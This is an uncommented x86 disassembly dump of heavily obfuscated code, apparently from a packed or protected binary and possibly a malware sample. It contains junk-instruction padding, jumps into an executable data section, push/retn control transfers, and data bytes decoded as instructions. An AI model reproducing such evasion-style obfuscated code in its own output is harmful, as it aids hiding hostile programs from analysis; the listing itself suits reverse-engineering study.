imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_425165
stc
push [ esp + 0x4 ]
cmp ebx 0x3d176e90
add edx ebx
jmp rwxdata
clc
mov edx [ edx + 0x80 ]
sub esp 0xfffffff4
jb rwxdata
bt bx bp
stc
call sub_42633a
test edx edx
push eax
pushfd
push 0xf634786d
lea esp [ esp + 0xc ]
je rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
mov edi esi
bts di 0x3
bt bp 0xc
and edi 0x22e35d4d
add edx ebx
movzx di al
cmc
mov [ ebp - 0x4 ] edx
rol dh 0x2
pushfd
dec dh
btc dx sp
mov edx [ ebp - 0x4 ]
rol di cl
call sub_4222e7
add [ eax ] al
inc ebx
insb
outsd
jae rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
push [ esp ]
jmp rwxdata
inc esp
and al 0x4
inc eax
dec eax
popad
outsb
insb
add dl dl
xchg ebp eax
shrd ax bp 0xa
bsf ax dx
lahf
daa
mov eax ebp
inc bl
adc bl 0xad
mov bl 0x1
push 0x34e5cdfe
test bh bl
pushfd
push 0xf4608972
mov [ esp + 0x14 ] esi
btc si 0x7
pushad
mov esi edi
test ebx 0x661a93ba
sub esi eax
call sub_4229ef
pop ecx
mov ecx [ esp + 0xc ]
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
mov [ esp + 0xc ] 0x8e
mov esp ebp
movzx bp dl
pop ebp
pushad
pushad
push [ esp + 0x40 ]
retn 0x44
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
sub_4251af
cmp eax 0x7f
call sub_422b90
add [ eax ] al
dec ecx
outsb
je rwxdata
insb
inc esi
imul ebp [ ebp + 0x4e ] 0x41656d61
jb rwxdata
push ebx
call sub_420983
rcr si 0xb
jmp rwxdata
add [ ebp - 0x3ff60608 ] al
push edi
push 0xfbcc92f9
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushad
mov [ esp + 0x1c ] 0xc8
lea esp [ esp + 0x40 ]
jmp rwxdata
insb
outsd
jae rwxdata
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
inc ecx
dec eax
popad
outsb
insb
add [ gs : esp + edx * 2 + 0x4244489 ] bl
clc
pushad
jmp rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
mov [ esp + 0x20 ] eax
test sp ax
stc
push [ esp ]
mov [ esp + 0x20 ] esi
pushfd
cmc
mov [ esp + 0x4 ] 0x75
mov [ esp + 0x20 ] edi
call sub_42638d
push 0x6aa9aedb
call sub_431bc1
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_42526f
bt di 0x2
add eax 0x2
cmp ax si
add eax ebx
lea esp [ esp + 0x4 ]
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_425307
shl bl cl
xchg ebp eax
shrd ax bp 0xa
bsf ax dx
lahf
daa
mov eax ebp
inc bl
adc bl 0xad
mov bl 0x1
push 0x34e5cdfe
test bh bl
pushfd
push 0xf4608972
mov [ esp + 0x14 ] esi
btc si 0x7
pushad
mov esi edi
test ebx 0x661a93ba
sub esi eax
call sub_4229ef
pop ecx
mov ecx [ esp + 0xc ]
jmp rwxdata
mov [ esp + 0xc ] 0x8e
mov esp ebp
movzx bp dl
pop ebp
pushad
pushad
push [ esp + 0x40 ]
retn 0x44
sub_425424
mov [ esp + 0x4 ] bl
add esi 0x4
mov [ esp + 0x18 ] 0xd0d84892
call sub_4266ba
mov [ esp + 0x20 ] eax
test sp ax
stc
push [ esp ]
mov [ esp + 0x20 ] esi
pushfd
cmc
mov [ esp + 0x4 ] 0x75
mov [ esp + 0x20 ] edi
call sub_42638d
push 0x6aa9aedb
call sub_431bc1
sub_425488
and eax 0xffff
mov [ esp ] 0x1103
lea esp [ esp + 0x4 ]
jmp rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_425618
add esi ebx
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_425624
lea esp [ esp + 0x10 ]
call sub_422e71
jmp rwxdata
jae rwxdata
not al
lodsb [ esi ]
clc
jmp rwxdata
xchg bl al
mov bl 0x2
mov al 0x2b
jmp rwxdata
pushad
ror al 0x1
push edx
test bl cl
test bl 0x12
add al 0x2e
call sub_422f5e
add [ eax ] al
push edx
popad
inc esi
imul ebp [ ebp ] 0xc2444c6
pushfd
inc ecx
pushad
mov al 0x10
call sub_425c93
add [ eax ] al
inc ebx
jb rwxdata
add [ eax ] al
add al bh
popad
je rwxdata
hlt
clc
push esp
push 0x64616572
add [ eax + 0x28 ] ch
loopne rwxdata
pop esi
retn
lea esp [ esp + 0x8 ]
jae rwxdata
jl rwxdata
jb rwxdata
call sub_422a18
push esi
lea esp [ esp + 0x4 ]
call sub_4225ad
cmp dx 0xbd1c
bt eax ebx
pushad
push [ esp ]
sub ecx ebx
call j_sub_426a30
push 0x1592fa47
mov [ esp ] ax
sub eax eax
push ebx
pushfd
call sub_425624
add esi ebx
pushfd
push 0x418dd011
lea esp [ esp + 0x8 ]
jmp rwxdata
test ch 0xb
push 0x9b7b5afb
sub eax eax
pushad
pushad
lea esp [ esp + 0x44 ]
call sub_422e71
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
rcr al cl
das
lea eax [ edi + 0x3cef715b ]
rcl ax 0xd
mov eax [ edx + 0xc ]
cmp sp si
add eax ebx
jmp rwxdata
call sub_425ee6
push 0x6e79aee4
call sub_432f0b
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_42597b
call sub_425216
cmc
push ebx
pushfd
call sub_4201cb
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
sub_425c93
pushfd
push 0x3beac131
lea esp [ esp + 0x30 ]
call sub_422e71
pushfd
adc al al
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
jmp rwxdata
jmp rwxdata
push edi
pushad
lea esp [ esp + 0x24 ]
call sub_422e71
pushfd
pushfd
adc al al
lea esp [ esp + 0x8 ]
je rwxdata
call sub_422c6e
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jae rwxdata
push 0x4ea24984
push [ esp ]
pushfd
mov [ esp + 0x4 ] dh
lea esp [ esp + 0xc ]
jne rwxdata
push ecx
lea esp [ esp + 0x4 ]
jne rwxdata
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
pushfd
stosb [ edi ]
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
push ebp
stosb [ edi ]
push [ esp ]
push edi
lea esp [ esp + 0xc ]
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_425cd8
pushad
push ecx
ror al 0x1
dec bl
xor bl dh
not bl
add al 0x2e
cmc
add bl bl
rol bl 0x3
neg bl
neg al
setl bl
rcl bl cl
sub al 0x4f
rol bl cl
clc
ror bl cl
mov [ esp ] dl
rol al 0x3
jmp rwxdata
stosb [ edi ]
pushfd
setbe bl
mov bl ah
mov bl 0x2
lea esp [ esp + 0x30 ]
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
